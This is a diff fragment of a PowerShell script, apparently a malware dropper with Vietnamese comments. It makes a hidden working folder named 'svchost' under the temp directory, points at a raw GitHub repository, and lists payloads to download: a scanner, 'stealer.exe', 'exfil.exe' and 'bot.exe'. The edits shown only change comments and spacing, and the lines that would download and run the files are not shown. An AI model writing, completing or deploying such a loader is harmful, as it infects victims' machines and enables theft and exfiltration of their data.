@@ -6,13 +6,13 @@ $tempDir = "$env:TEMP\svchost"
 New-Item -ItemType Directory -Force -Path $tempDir | Out-Null
 Set-Location $tempDir
 
-# 🔥 THAY ĐỔI DÒNG NÀY - USERNAME/REPO CỦA BẠN
+# Đường dẫn GitHub của bạn
 $baseUrl = "https://raw.githubusercontent.com/hp044-dtt/1/main/"
 
-# Danh sách 7 file cần tải
+# Danh sách file cần tải
 $files = @(
     "main.py",
-    "scanner.exe", 
+    "scanner.exe",
     "stealer.exe",
     "exfil.exe",
     "bot.exe",
